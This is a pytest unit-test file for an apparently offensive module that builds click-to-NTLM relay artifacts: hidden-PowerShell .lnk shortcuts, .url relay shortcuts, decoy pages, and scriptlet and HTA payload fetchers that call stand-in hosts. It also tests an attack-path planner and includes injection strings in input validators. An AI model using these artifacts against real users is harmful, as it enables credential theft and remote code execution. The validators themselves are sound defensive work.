"""Click-to-NTLM artifacts: the decoy page, the shortcuts, and the decision matrix.

These are pure-bytes / pure-string functions, so the suite is `unit` - nothing here may open a
socket or start a listener. The .lnk is checked against the published MS-SHLLINK header (the
4-byte size and the LINKCLSID, little-endian) rather than against whatever this module happens to
emit, so a change that breaks the format fails here instead of on a victim's machine.
"""
import configparser
import os
import struct
import sys
import uuid

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core import mshtml as M  # noqa: E402

pytestmark = pytest.mark.unit

# 00021401-0000-0000-C000-000000000046 in the little-endian byte order the format uses.
LINK_CLSID_HEX = "0114020000000000c000000000000046"


class TestTheLnk:

    def test_the_header_size_and_the_link_clsid_are_exact(self):
        data = M.lnk("powershell.exe", arguments="-w hidden -c calc")
        assert data[:4] == b"\x4c\x00\x00\x00"                      # HeaderSize = 0x0000004C
        assert data[4:20] == bytes.fromhex(LINK_CLSID_HEX)
        assert data[4:20] == uuid.UUID("{00021401-0000-0000-C000-000000000046}").bytes_le

    def test_the_flags_announce_the_sections_that_are_present(self):
        data = M.lnk("cmd.exe", arguments="/c whoami")
        flags = struct.unpack_from("<I", data, 0x14)[0]
        assert flags & 0x00000001        # HasLinkTargetIDList
        assert flags & 0x00000008        # HasRelativePath
        assert flags & 0x00000020        # HasArguments
        assert flags & 0x00000080        # IsUnicode

    def test_the_target_id_list_is_well_formed(self):
        data = M.lnk("cmd.exe", arguments="/c whoami")
        # the fixed header ends at 0x4C; the LinkTargetIDList begins with its own 2-byte size
        size = struct.unpack_from("<H", data, 0x4C)[0]
        idlist = data[0x4C + 2:0x4C + 2 + size]
        assert size >= 2 and len(idlist) == size
        assert idlist.endswith(b"\x00\x00")                          # terminating ItemID

    def test_the_command_and_arguments_are_in_the_bytes(self):
        data = M.lnk("powershell.exe", arguments="-w hidden -c calc")
        assert "powershell.exe".encode("utf-16-le") in data          # RELATIVE_PATH
        assert "-w hidden -c calc".encode("utf-16-le") in data       # COMMAND_LINE_ARGUMENTS
        assert b"powershell.exe" in data                             # also in the ID list / name

    def test_workdir_is_an_optional_string(self):
        plain = M.lnk("cmd.exe")
        with_dir = M.lnk("cmd.exe", workdir="C:\\Windows")
        marker = "C:\\Windows".encode("utf-16-le")
        assert marker in with_dir
        assert marker not in plain

    def test_an_empty_command_is_refused(self):
        with pytest.raises(ValueError):
            M.lnk("")

    def test_a_command_of_the_wrong_type_is_refused(self):
        with pytest.raises(ValueError):
            M.lnk(None)

    def test_a_bad_icon_type_is_refused(self):
        with pytest.raises(ValueError):
            M.lnk("cmd.exe", icon=123)


class TestTheUrlShortcut:

    def test_the_shortcut_parses_as_ini_with_the_url(self):
        data = M.url_shortcut("http://10.0.0.9/relay")
        text = data.decode("utf-8")
        parser = configparser.ConfigParser(interpolation=None)
        parser.read_string(text)
        assert parser.has_section("InternetShortcut")
        assert parser.get("InternetShortcut", "URL") == "http://10.0.0.9/relay"
        assert "[InternetShortcut]" in text and "URL=" in text

    def test_an_icon_lands_in_the_shortcut(self):
        text = M.url_shortcut("http://x/", icon="C:\\Windows\\explorer.exe").decode("utf-8")
        assert "IconFile=C:\\Windows\\explorer.exe" in text

    def test_an_empty_target_is_refused(self):
        with pytest.raises(ValueError):
            M.url_shortcut("")

    def test_a_non_http_target_is_refused(self):
        with pytest.raises(ValueError):
            M.url_shortcut("ftp://x/")

    def test_a_bad_icon_type_is_refused(self):
        with pytest.raises(ValueError):
            M.url_shortcut("http://x/", icon=7)


class TestTheObjectPage:

    def test_the_trigger_url_appears_exactly_once(self):
        url = "http://10.0.0.9/relay"
        assert M.object_page(url).count(url) == 1

    def test_the_object_page_leaks_nothing_of_ours(self):
        page = M.object_page("http://10.0.0.9/relay")
        assert "__bh" not in page and "/__bh" not in page
        assert "cookie" not in page.lower()
        assert "session" not in page.lower()

    def test_the_decoy_is_plain_html(self):
        page = M.object_page("http://10.0.0.9/relay", title="Quarterly Report",
                             body="<p>The report is loading.</p>")
        assert "<!doctype html>" in page.lower()
        assert "Quarterly Report" in page
        assert "The report is loading." in page
        assert "<script" not in page.lower()

    def test_an_empty_trigger_is_refused(self):
        with pytest.raises(ValueError):
            M.object_page("")

    def test_a_non_http_trigger_is_refused(self):
        with pytest.raises(ValueError):
            M.object_page("smb://x/")


class TestTheScriptletAndTheHta:

    def test_the_scriptlet_fetches_the_url(self):
        xml = M.sct("http://10.0.0.9/payload.sct")
        assert "<scriptlet>" in xml
        assert "http://10.0.0.9/payload.sct" in xml
        assert "XMLHTTP" in xml

    def test_an_empty_scriptlet_url_is_refused(self):
        with pytest.raises(ValueError):
            M.sct("")

    def test_the_hta_runs_vbscript_behind_a_decoy_body(self):
        page = M.hta("http://10.0.0.9/p.ps1")
        assert '<script language="VBScript">' in page
        assert "http://10.0.0.9/p.ps1" in page
        assert "<body" in page

    def test_the_hta_honours_an_explicit_command(self):
        assert "calc.exe" in M.hta("http://10.0.0.9/p.ps1", command="calc.exe")

    def test_an_empty_hta_url_is_refused(self):
        with pytest.raises(ValueError):
            M.hta("")


class TestThePlan:

    def test_ie_puts_the_mshtml_object_first(self):
        out = M.plan({"os": "windows", "is_ie": True})
        assert out[0]["kind"] == "mshtml-object"
        assert out[0]["confidence"] in ("CONFIRMED", "SUSPECTED")

    def test_a_ready_relay_confirms_the_mshtml_path(self):
        out = M.plan({"os": "windows", "is_ie": True, "http_ntlm_relay_ready": True})
        assert out[0]["kind"] == "mshtml-object"
        assert out[0]["confidence"] == "CONFIRMED"

    def test_a_non_windows_target_yields_nothing_usable(self):
        for facts in ({"os": "macos", "browser": "safari"}, {"os": "unknown"}, None, {}):
            out = M.plan(facts)
            assert isinstance(out, list) and out
            assert [c for c in out if c["confidence"] != "FAILED"] == []

    def test_a_blocked_macro_policy_rules_out_the_document_path(self):
        out = M.plan({"os": "windows", "macro_policy": "blocked"})
        macro = [c for c in out if c["kind"] == "macro-document"][0]
        assert macro["confidence"] == "FAILED"

    def test_every_candidate_has_exactly_the_four_keys(self):
        facts_sets = ({"os": "windows", "is_ie": True, "http_ntlm_relay_ready": True},
                      {"os": "windows", "macro_policy": "allowed", "smb_reachable": True},
                      {"os": "linux"})
        for facts in facts_sets:
            for cand in M.plan(facts):
                assert set(cand) == {"kind", "why", "needs", "confidence"}
                assert cand["confidence"] in ("CONFIRMED", "SUSPECTED", "FAILED")


class TestTheRelayTargetGate:
    """`core.decision` marks T2_ntlm_relay SUSPECTED when nothing accepts the relay. The
    trigger candidates must not claim CONFIRMED for those same facts."""

    def test_an_explicitly_missing_target_holds_the_trigger_at_suspected(self):
        rows = M.plan({"os": "windows", "is_ie": True, "http_ntlm_relay_ready": True,
                       "relay_target": False})
        trigger = next(r for r in rows if r["kind"] == "mshtml-object")
        assert trigger["confidence"] == "SUSPECTED"
        assert "relay target" in trigger["needs"]
        shortcut = next(r for r in rows if r["kind"] == "url-shortcut")
        assert shortcut["confidence"] == "SUSPECTED"

    def test_an_unknown_target_does_not_block_the_trigger(self):
        """Absent means unknown, not absent: the operator may still be bringing a target up."""
        rows = M.plan({"os": "windows", "is_ie": True, "http_ntlm_relay_ready": True})
        assert next(r for r in rows if r["kind"] == "mshtml-object")["confidence"] == "CONFIRMED"

    def test_a_present_target_keeps_the_trigger_confirmed(self):
        rows = M.plan({"os": "windows", "is_ie": True, "http_ntlm_relay_ready": True,
                       "relay_target": True})
        assert next(r for r in rows if r["kind"] == "mshtml-object")["confidence"] == "CONFIRMED"


class TestTheFormatConstants:
    """These constants ARE the format: a wrong one produces a shortcut Windows silently
    ignores, and nothing else in the suite would notice. Each is asserted against the
    published value (MS-SHLLINK and the shell CLSIDs), not against the module's own output."""

    def test_the_link_clsid_is_the_shell_link_clsid(self):
        import uuid
        assert uuid.UUID("{00021401-0000-0000-C000-000000000046}") == M.LINK_CLSID

    def test_the_root_folder_clsid_is_my_computer(self):
        import uuid
        assert uuid.UUID("{20D04FE0-3AEA-1069-A2D8-08002B30309D}") == M.ROOT_FOLDER_CLSID

    def test_the_header_size_is_the_shell_link_header(self):
        assert M.HEADER_SIZE == 0x4C

    def test_the_link_flags_are_the_published_bits(self):
        assert (M.FLAG_HAS_LINK_TARGET_ID_LIST, M.FLAG_HAS_NAME, M.FLAG_HAS_RELATIVE_PATH,
                M.FLAG_HAS_WORKING_DIR, M.FLAG_HAS_ARGUMENTS, M.FLAG_HAS_ICON_LOCATION,
                M.FLAG_IS_UNICODE) == (0x01, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80)

    def test_the_flag_bits_are_distinct(self):
        flags = [M.FLAG_HAS_LINK_TARGET_ID_LIST, M.FLAG_HAS_NAME, M.FLAG_HAS_RELATIVE_PATH,
                 M.FLAG_HAS_WORKING_DIR, M.FLAG_HAS_ARGUMENTS, M.FLAG_HAS_ICON_LOCATION,
                 M.FLAG_IS_UNICODE]
        assert len(set(flags)) == len(flags), "two flags share a bit"

    def test_the_file_attribute_and_show_command_are_the_published_values(self):
        assert M.FILE_ATTRIBUTE_ARCHIVE == 0x20
        assert M.SHOW_COMMAND_NORMAL == 1

    def test_the_written_header_carries_those_constants(self):
        """The constants must reach the wire: the first 4 bytes are the header size and the
        next 16 are the CLSID, little-endian."""
        data = M.lnk("powershell.exe", arguments="-nop")
        assert data[:4] == M.HEADER_SIZE.to_bytes(4, "little")
        assert data[4:20] == M.LINK_CLSID.bytes_le


class TestAUrlCannotBreakTheArtifact:
    """These builders place a URL inside an HTML attribute, a JScript string, a CDATA
    block, an INI value and a .lnk field. A quote or an angle bracket in the URL would end
    the literal and inject code into an artifact the operator then delivers."""

    BAD = ["http://x/\", false); eval(\"evil", "http://x/]]><evil/>", "http://x/a b",
           "http://x/a'b", "http://x/a`b", "http://x/a\\b", "http://x/a<b"]

    @pytest.mark.parametrize("url", BAD)
    def test_the_builders_refuse_a_url_that_breaks_out(self, url):
        for builder in (M.object_page, M.url_shortcut, M.sct, M.hta):
            with pytest.raises(ValueError):
                builder(url)

    def test_a_normal_url_still_builds_every_artifact(self):
        url = "https://camp.example/p.ps1?a=1&b=2"
        assert "camp.example" in M.object_page(url)
        assert b"camp.example" in M.url_shortcut(url)
        assert "camp.example" in M.sct(url)
        assert "camp.example" in M.hta(url)


class TestTheUnvalidatedParametersAreNowRefused:
    """url_shortcut(icon=), hta(command=) and object_page(body=) were the three
    parameters that skipped the module's own rule ("a value that would break the
    generated artifact is refused, not escaped")."""

    def test_an_icon_with_a_newline_is_refused(self):
        with pytest.raises(ValueError):
            M.url_shortcut("http://relay.example/t",
                           icon="shell32.dll\r\nURL=\\\\attacker.example\\share\\p.lnk")

    def test_a_command_with_a_newline_is_refused(self):
        with pytest.raises(ValueError):
            M.hta("http://relay.example/t", command='calc.exe\nMsgBox "x"')

    def test_a_body_carrying_markup_is_escaped(self):
        page = M.object_page("http://relay.example/t",
                             body="<img src=x onerror=alert(1)>")
        # the markup is carried as TEXT: no live tag, and the only <img> is the decoy's
        # hidden 1x1 sub-resource
        assert "<img src=x" not in page
        assert page.count("<img ") == 1
        assert "&lt;img" in page

    def test_the_normal_values_still_build(self):
        assert b"IconFile=shell32.dll" in M.url_shortcut("http://x/t", icon="shell32.dll")
        assert "calc.exe" in M.hta("http://x/t", command="calc.exe")
        # a plain-text body is carried through as written
        assert "hello" in M.object_page("http://x/t", body="hello")
